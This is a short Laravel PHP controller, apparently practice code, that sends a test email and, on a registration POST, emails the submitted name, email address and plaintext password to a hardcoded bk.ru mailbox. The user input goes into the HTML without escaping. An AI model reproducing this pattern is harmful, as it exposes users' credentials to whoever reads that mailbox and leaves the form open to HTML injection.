<?php

namespace App\Http\Controllers;

use App\Mail\TestMail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Mail;

class SendController extends Controller
{
    public function index(){
        Mail::to('vsehsvt@bk.ru')->send(new TestMail());
        return view('mail.test');
    }

    public function register(Request $request){

        if($request->method() == 'POST'){
            $body="<p><b>Имя: {$request->input('name')}</b></p>";
            $body.="<p><b>E-mail: {$request->input('email')}</b></p>";
            $body.="<p><b>Пароль: {$request->input('pass')}</b></p>";
            Mail::to('vsehsvt@bk.ru')->send(new TestMail($body));
        }
    }
}
